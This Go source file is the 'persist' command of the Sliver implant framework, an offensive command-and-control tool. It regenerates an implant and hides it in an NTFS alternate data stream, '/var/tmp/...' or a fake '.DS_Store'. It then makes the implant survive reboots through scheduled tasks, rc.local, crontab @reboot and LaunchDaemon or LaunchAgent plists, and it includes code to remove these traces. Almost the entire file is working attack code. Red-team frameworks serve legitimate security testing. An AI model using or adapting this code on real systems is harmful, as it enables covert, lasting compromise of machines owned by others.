package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"strings"

	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"

	"github.com/desertbit/grumble"
)

func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.GetInteractive()
	if session == nil {
		return
	}

	path := ""
	sliver := ctx.Flags.String("sliver")
	if sliver == "" {
		sliver = session.Name
		fmt.Printf(Info+"Sliver not specified. Defaulting to %s\n", sliver)
	}
	stageOS := session.OS

	if ctx.Flags.Bool("unload") {
		switch stageOS {
		case "windows":
			if session.Username == "NT AUTHORITY\\SYSTEM" {
				_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
					Path:      "C:\\:" + sliver + ".exe",
					Recursive: false,
					Force:     true,
					Request:   ActiveSession.Request(ctx),
				})
				if err != nil {
					fmt.Printf(Warn+"Error: %v\n", err)
					return
				}

				_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
					Path:    "C:\\Windows\\System32\\schtasks.exe",
					Args:    []string{"/delete", "/tn", sliver, "/f"},
					Output:  false,
					Request: ActiveSession.Request(ctx),
				})
				if err != nil {
					fmt.Printf(Warn+"Error: %v\n", err)
					return
				}
			} else {
				user := strings.Split(session.Username, "\\")
				_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
					Path:      "C:\\Users\\" + user[len(user)-1] + ":" + sliver + ".exe",
					Recursive: false,
					Force:     true,
					Request:   ActiveSession.Request(ctx),
				})
				if err != nil {
					fmt.Printf(Warn+"Error: %v\n", err)
					return
				}

				_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
					Path:    "C:\\Windows\\System32\\schtasks.exe",
					Args:    []string{"/delete", "/tn", sliver, "/f"},
					Output:  false,
					Request: ActiveSession.Request(ctx),
				})
				if err != nil {
					fmt.Printf(Warn+"Error: %v\n", err)
					return
				}
			}
		case "linux":
			_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
				Path:      "/var/tmp/...",
				Recursive: false,
				Force:     true,
				Request:   ActiveSession.Request(ctx),
			})
			if err != nil {
				fmt.Printf(Warn+"Error: %v\n", err)
				return
			}

			if session.Username == "root" {
				resp, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
					Path:    "/etc/rc.local",
					Request: ActiveSession.Request(ctx),
				})
				if err != nil {
					fmt.Printf(Warn+"Error: %v\n", err)
					return
				}

				rc := strings.Split(string(resp.Data), "\n")
				leline, rc := rc[len(rc)-1], rc[:len(rc)-1]
				rc = rc[:len(rc)-1]
				rc = append(rc, leline)

				_, err = rpc.Upload(context.Background(), &sliverpb.UploadReq{
					Path:    "/etc/rc.local",
					Encoder: "gzip",
					Data:    new(encoders.Gzip).Encode([]byte(strings.Join(rc[:], "\n"))),
					Request: ActiveSession.Request(ctx),
				})
				if err != nil {
					fmt.Printf(Warn+"Error: %v\n", err)
					return
				}
			} else {
				_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
					Path:    "/bin/sh",
					Args:    []string{"-c", "\"crontab -r\""},
					Output:  false,
					Request: ActiveSession.Request(ctx),
				})
				if err != nil {
					fmt.Printf(Warn+"Error: %v\n", err)
					return
				}
			}
		case "darwin":
			_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
				Path:      "/var/tmp/.DS_Store",
				Recursive: false,
				Force:     true,
				Request:   ActiveSession.Request(ctx),
			})
			if err != nil {
				fmt.Printf(Warn+"Error: %v\n", err)
				return
			}

			if session.Username == "root" {
				path = "/Library/LaunchDaemons/." + sliver + ".plist"
				/*
					_, err = rpc.Rm(context.Background(), &sliverpb.RmReq{
						Path:      "/etc/emond.d/rules/" + sliver + ".plist",
						Recursive: false,
						Force:     true,
						Request:   ActiveSession.Request(ctx),
					})
					if err != nil {
						fmt.Printf(Warn+"Error: %v\n", err)
						return
					}
				*/
			} else {
				path = "/Users/" + session.Username + "/Library/LaunchAgents/." + sliver + ".plist"
			}
			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
				Path:    "/bin/launchctl",
				Args:    []string{"unload", path},
				Output:  false,
				Request: ActiveSession.Request(ctx),
			})
			if err != nil {
				fmt.Printf(Warn+"Error: %v\n", err)
				return
			}

			_, err = rpc.Rm(context.Background(), &sliverpb.RmReq{
				Path:      path,
				Recursive: false,
				Force:     true,
				Request:   ActiveSession.Request(ctx),
			})
			if err != nil {
				fmt.Printf(Warn+"Error: %v\n", err)
				return
			}
		}
		fmt.Println(Info + "Done!")
		return
	}

	if !isUserAnAdult() {
		return
	}

	ctrl := make(chan bool)
	go spin.Until("Regenerating sliver, please wait ...", ctrl)
	stageFile, err := rpc.Regenerate(context.Background(), &clientpb.RegenerateReq{
		ImplantName: sliver,
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}

	fmt.Println(Info + "Sliver regenerated. (Pretty much Indestructible)")
	exe := string(stageFile.GetFile().GetData())

	// Upload file
	switch stageOS {
	case "windows":
		// %HOMEPATH% Variable expansion would make this more reliable
		if session.Username == "NT AUTHORITY\\SYSTEM" {
			path = "C:\\:" + sliver + ".exe"
		} else {
			user := strings.Split(session.Username, "\\")
			path = "C:\\Users\\" + user[len(user)-1] + ":" + sliver + ".exe"
		}
	case "linux":
		path = "/var/tmp/..."
	case "darwin":
		path = "/var/tmp/.DS_Store"
	}
	gzip := new(encoders.Gzip)
	ctrl = make(chan bool)
	go spin.Until("Uploading the sliver, please wait...", ctrl)
	resp, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Path:    path,
		Encoder: "gzip",
		Data:    gzip.Encode([]byte(exe)),
		Request: ActiveSession.Request(ctx),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}
	path = resp.Path
	fmt.Printf(Info+"Path: %s\n", path)

	switch stageOS {
	case "windows":
		path = fmt.Sprintf("C:\\Windows\\System32\\Wbem\\wmic.exe process call create \"%s\"", path)
		fmt.Println(Info + path)
		if session.Username == "NT AUTHORITY\\SYSTEM" {
			// Root persistence (schtasks)
			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
				Path:    "C:\\Windows\\System32\\schtasks.exe",
				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "onstart", "/ru", "System", "/f"},
				Output:  false,
				Request: ActiveSession.Request(ctx),
			})
			if err != nil {
				fmt.Printf(Warn+"Error: %v\n", err)
				return
			}
		} else {
			// User persistence (schtasks)
			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
				Path:    "C:\\Windows\\System32\\schtasks.exe",
				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "onlogon", "/f"},
				Output:  false,
				Request: ActiveSession.Request(ctx),
			})
			if err != nil {
				fmt.Printf(Warn+"Err: %v\n", err)
				return
			}
		}
	case "linux":
		_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
			Path:    "/bin/chmod",
			Args:    []string{"0100", path},
			Output:  false,
			Request: ActiveSession.Request(ctx),
		})
		if err != nil {
			fmt.Printf(Warn+"Error: %v\n", err)
			return
		}

		if session.Username == "root" {
			// Root persistence (rc.local)
			resp, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
				Path:    "/etc/rc.local",
				Request: ActiveSession.Request(ctx),
			})
			if err != nil {
				fmt.Printf(Warn+"Error: %v\n", err)
				return
			}

			rc := strings.Split(string(resp.Data), "\n")
			leline, rc := rc[len(rc)-1], rc[:len(rc)-1]
			rc = append(rc, path+" & disown")
			rc = append(rc, leline)

			_, err = rpc.Upload(context.Background(), &sliverpb.UploadReq{
				Path:    "/etc/rc.local",
				Encoder: "gzip",
				Data:    gzip.Encode([]byte(strings.Join(rc[:], "\n"))),
				Request: ActiveSession.Request(ctx),
			})
			if err != nil {
				fmt.Printf(Warn+"Error: %v\n", err)
				return
			}
		} else {
			// User persistence (crontab)
			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
				Path:    "/bin/sh",
				Args:    []string{"-c", fmt.Sprintf("\"echo \\\"@reboot %s\\\" | crontab -\"", path)},
				Output:  false,
				Request: ActiveSession.Request(ctx),
			})
			if err != nil {
				fmt.Printf(Warn+"Error: %v\n", err)
				return
			}
		}
	case "darwin":
		_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
			Path:    "/bin/chmod",
			Args:    []string{"0100", path},
			Output:  false,
			Request: ActiveSession.Request(ctx),
		})
		if err != nil {
			fmt.Printf(Warn+"Error: %v\n", err)
			return
		}

		plist := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
		plist += "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
		plist += "<plist version=\"1.0\">"
		plist += "<dict><key>Label</key><string>"
		plist += sliver
		plist += "</string><key>Program</key><string>"
		plist += path
		plist += "</string><key>RunAtLoad</key><true/>"
		plist += "<key>KeepAlive</key><true/>"
		plist += "</dict></plist>"
		fmt.Println(Info + "Plist: " + plist)
		if session.Username == "root" {
			// Root persistence (launchctl)
			path = "/Library/LaunchDaemons/." + sliver + ".plist"
			/*
				// Root persistence (emond)
				plist += "<array><dict><key>name</key><string>"
				plist += sliver
				plist += "</string><key>enabled</key><true/><key>eventTypes</key><array><string>startup</string></array>"
				plist += "<key>actions</key><array><dict><key>command</key><string>"
				plist += path
				plist += "</string><key>user</key><string>root</string><key>arguments</key><array></array><key>type</key>"
				plist += "<string>RunCommand</string></dict></array></dict></array></plist>"
				fmt.Println(Info + "Plist: " + plist)

				_, err = rpc.Upload(context.Background(), &sliverpb.UploadReq{
					Path:    "/etc/emond.d/rules/" + sliver + ".plist",
					Encoder: "gzip",
					Data:    gzip.Encode([]byte(plist)),
					Request: ActiveSession.Request(ctx),
				})
				if err != nil {
					fmt.Println(Warn + "failed to upload plist.")
					return
				}
			*/
		} else {
			// User persistence (launchctl)

			path = "/Users/" + session.Username + "/Library/LaunchAgents/." + sliver + ".plist"
		}
		_, err = rpc.Upload(context.Background(), &sliverpb.UploadReq{
			Path:    path,
			Encoder: "gzip",
			Data:    gzip.Encode([]byte(plist)),
			Request: ActiveSession.Request(ctx),
		})
		if err != nil {
			fmt.Printf(Warn+"Error: %v\n", err)
			return
		}

		_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
			Path:    "/bin/launchctl",
			Args:    []string{"load", path},
			Output:  false,
			Request: ActiveSession.Request(ctx),
		})
		if err != nil {
			fmt.Println(Warn + "failed to enable plist.")
			return
		}
	}
	fmt.Println(Info + "Done!")
}
